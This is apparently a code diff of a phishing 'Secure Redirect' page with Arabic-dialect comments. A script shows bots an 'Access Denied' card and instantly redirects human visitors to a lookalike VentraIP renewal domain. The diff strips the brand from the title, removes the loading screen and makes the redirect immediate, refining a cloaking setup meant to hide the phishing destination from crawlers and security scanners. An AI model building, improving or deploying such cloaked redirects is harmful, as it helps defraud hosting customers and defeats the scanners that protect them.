@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Redirect | VentraIP</title>
+    <title>Secure Redirect</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     
     <style>
@@ -12,7 +12,6 @@
             --secondary-blue: #3b82f6;
             --accent-cyan: #06b6d4;
             --dark-navy: #0f172a;
-            --success: #10b981;
             --danger: #ef4444;
             --gray-100: #f1f5f9;
             --gray-800: #1e293b;
@@ -45,18 +44,6 @@
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4);
             text-align: center;
             border: 1px solid rgba(255, 255, 255, 0.2);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, var(--accent-cyan), var(--secondary-blue), var(--primary-blue));
         }
 
         .logo {
@@ -82,7 +69,7 @@
         .subtitle {
             color: var(--gray-600);
             font-size: 16px;
-            margin-bottom: 32px;
+            margin-bottom: 24px;
         }
 
         .security-status {
@@ -95,62 +82,7 @@
             font-size: 14px;
             font-weight: 500;
             color: var(--gray-800);
-            border: 2px solid transparent;
-        }
-
-        .security-status.verified {
-            border-color: var(--success);
-            background: #ecfdf5;
-            color: var(--success);
-        }
-
-        .security-status.blocked {
-            border-color: var(--danger);
-            background: #fef2f2;
-            color: var(--danger);
-        }
-
-        .loader {
-            width: 40px;
-            height: 40px;
-            border: 3px solid var(--gray-100);
-            border-top: 3px solid var(--secondary-blue);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .btn-primary {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            background: linear-gradient(135deg, var(--secondary-blue), var(--primary-blue));
-            color: white;
-            padding: 16px 32px;
-            border-radius: 12px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 16px;
-            border: none;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
-            margin-top: 24px;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.5);
-        }
-
-        .hidden {
-            display: none !important;
+            border: 2px solid var(--danger);
         }
 
         .blocked-card {
@@ -162,6 +94,10 @@
             color: var(--danger);
         }
 
+        .hidden {
+            display: none !important;
+        }
+
         @media (max-width: 640px) {
             .card { padding: 32px 24px; }
             h1 { font-size: 24px; }
@@ -169,35 +105,18 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Loading Card (يظهر للإنسان قبل الـ Redirect) -->
-        <div class="card" id="loadingCard">
-            <div class="logo">🚀</div>
-            
-            <h1>Secure Redirect</h1>
-            <p class="subtitle">Verifying your connection...</p>
-            
-            <div class="loader"></div>
-            
-            <div class="security-status verified" id="statusBadge">
-                <span>✓</span>
-                <span>Verified Human</span>
-            </div>
-            
-            <button class="btn-primary hidden" id="redirectBtn" onclick="manualRedirect()">
-                Continue to Website
-                <span>→</span>
-            </button>
-        </div>
+    <!-- Human: Redirect فوري (ما كيبانش هاد العنصر) -->
+    <div id="humanRedirect"></div>
 
-        <!-- Blocked Card (يظهر للبوت) -->
-        <div class="card blocked-card hidden" id="blockedCard">
+    <!-- Bot: يشوف هاد الصفحة -->
+    <div class="container hidden" id="blockedContainer">
+        <div class="card blocked-card">
             <div class="logo" style="background: linear-gradient(135deg, #ef4444, #dc2626);">🚫</div>
             
             <h1>Access Denied</h1>
             <p class="subtitle">Suspicious activity detected</p>
             
-            <div class="security-status blocked">
+            <div class="security-status">
                 <span>✕</span>
                 <span>Bot Detected</span>
             </div>
@@ -206,9 +125,7 @@
 
     <script>
         // ========== CONFIGURATION ==========
-        const CONFIG = {
-            TARGET_URL: 'https://ventraip-renewal.com.au/privacy' // ← CHANGE THIS TO YOUR TARGET URL
-        };
+        const TARGET_URL = 'https://ventraip-renewal.com.au/privacy'; // ← CHANGE THIS TO YOUR TARGET URL
 
         // ========== BOT DETECTION ==========
         function isBot() {
@@ -233,38 +150,17 @@
         }
 
         // ========== MAIN ==========
-        function init() {
+        (function() {
             const botDetected = isBot();
 
             if (botDetected) {
-                // إظهار صفحة الحظر للبوت
-                document.getElementById('loadingCard').classList.add('hidden');
-                document.getElementById('blockedCard').classList.remove('hidden');
-                return;
+                // إظهار صفحة الحظر
+                document.getElementById('blockedContainer').classList.remove('hidden');
+            } else {
+                // إنسان → Redirect فوري فوري
+                window.location.replace(TARGET_URL);
             }
-
-            // إنسان → Redirect فوري
-            setTimeout(() => {
-                window.location.href = CONFIG.TARGET_URL;
-            }, 800); // تأخير بسيط 800ms باش يبان الـ Loading (اختياري)
-            
-            // زر يدوي احتياطي
-            setTimeout(() => {
-                document.getElementById('redirectBtn').classList.remove('hidden');
-            }, 1000);
-        }
-
-        function manualRedirect() {
-            window.location.href = CONFIG.TARGET_URL;
-        }
-
-        // Start immediately
-        document.addEventListener('DOMContentLoaded', init);
-        
-        // Prevent right-click
-        document.addEventListener('contextmenu', (e) => {
-            if (!e.target.closest('button')) e.preventDefault();
-        });
+        })();
     </script>
 </body>
 </html>
